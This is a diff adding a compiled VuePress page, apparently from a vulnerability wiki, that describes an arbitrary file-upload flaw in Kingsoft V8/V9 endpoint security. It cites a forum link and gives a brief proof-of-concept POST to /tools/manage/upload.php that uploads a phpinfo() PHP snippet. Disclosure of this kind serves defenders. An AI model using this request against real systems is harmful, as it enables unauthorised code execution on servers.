@@ -1,0 +1,5 @@
+import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r,o,c as s,a as e,b as a,d as i,e as l}from"./app-58e4a7d6.js";const d={},_=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),c=e("p",null,"参考链接：",-1),h={href:"https://forum.butian.net/share/76",target:"_blank",rel:"noopener noreferrer"},p=l(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>在tools目录下的mange下存在一个upload.php。该文件可导致任意文件上传。</p><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /tools/manage/upload.php HTTP/1.1
+HOST: target
+...
+&lt;?php phpinfo(); ?&gt;
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,4);function u(m,f){const n=r("ExternalLinkIcon");return o(),s("div",null,[_,c,e("ul",null,[e("li",null,[e("a",h,[a("https://forum.butian.net/share/76"),i(n)])])]),p])}const x=t(d,[["render",u],["__file","金山 V8 V9 终端安全系统 文件上传漏洞.html.vue"]]);export{x as default};
